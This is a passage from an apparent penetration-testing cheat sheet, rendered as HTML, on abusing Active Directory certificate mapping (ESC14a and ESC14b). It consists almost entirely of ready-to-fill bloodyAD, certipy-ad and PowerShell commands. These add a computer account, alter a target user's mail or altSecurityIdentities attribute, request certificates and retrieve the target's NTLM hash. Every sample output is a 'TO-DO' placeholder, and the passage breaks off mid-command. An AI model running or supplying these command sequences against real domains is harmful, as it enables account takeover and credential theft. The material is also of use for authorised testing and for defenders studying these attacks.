</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> add computer '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>' '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add computer '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>' '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add computer '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>' '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add computer '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>' '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-request-a-cert-of-the-computer">2. Request a Cert of the Computer</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>$' -p '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'Machine' 
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>$' -p '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;DC&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'Machine'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-convert-pfx-to-crt">3. Convert .pfx to .crt</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx <span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>.pfx -nokey -out "<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>.crt" 
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-inspect-serial-number-and-issuer">4. Inspect Serial Number and Issuer</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">openssl x509 -in <span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>.crt -noout -text
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="5-convert-to-x509-issuer-serialnumber-format">5. Convert to X509 Issuer SerialNumber Format</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 conv.py -serial '<span class="o editable-keyword">&lt;SERIAL_NUMBER&gt;</span>' -issuer '<span class="o editable-keyword">&lt;ISSUER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="6-update-attribute-from-windows">6. Update Attribute (From Windows)</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">map</span> <span class="o">=</span> <span class="s1">'<span class="o editable-keyword">&lt;X509_ISSUER_SERIAL_NUMBER_FORMAT&gt;</span>'</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-ADUser <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -Replace @{altSecurityIdentities=$map}
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="7-get-ntlm-hash">7. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx <span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><p><small><em>Ref: <a href="https://mayfly277.github.io/posts/ADCS-part14/#esc14-a---write-access-on-altsecurityidentities">conv.py</a></em></small></p></div></div><p></p>
<hr>
<h3 id="esc14b-weak-explicit-certificate-mapping-e-mail">ESC14b: Weak Explicit Certificate Mapping (E-Mail)</h3>
<p class="tabs">
<button data-tabset="set16" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set16"><div class="tabcontent active" data-tabset="set16" data-tabcontent="tab1"><h4 id="1-modify-email-of-target-user">1. Modify Email of Target User</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> set object <span class="o editable-keyword">&lt;USER&gt;</span> mail -v '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> set object <span class="o editable-keyword">&lt;USER&gt;</span> mail -v '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> set object <span class="o editable-keyword">&lt;USER&gt;</span> mail -v '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -f rc4 -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> set object <span class="o editable-keyword">&lt;USER&gt;</span> mail -v '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -k --host <span class="o editable-keyword">&lt;DC&gt;</span> set object <span class="o editable-keyword">&lt;USER&gt;</span> mail -v '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-request-a-cert">2. Request a Cert</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
